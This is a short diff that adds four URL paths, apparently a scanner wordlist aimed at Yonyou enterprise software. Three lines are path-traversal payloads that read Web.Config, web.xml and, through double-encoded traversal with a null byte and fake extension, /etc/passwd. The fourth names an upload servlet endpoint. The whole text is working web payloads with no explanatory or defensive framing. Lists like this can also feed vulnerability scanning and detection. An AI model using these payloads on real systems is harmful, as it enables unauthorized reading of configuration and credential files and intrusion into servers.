@@ -1,0 +1,4 @@
+/tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config
+/service/~baseapp/UploadServlet
+/portal/file?cmd=getFileLocal&fileid=..%2F..%2F..%2F..%2Fwebapps/nc_web/WEB-INF/web.xml
+/iuap-apcom-workbench/ucf-wh/yonbiplogin/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%2500.png.js
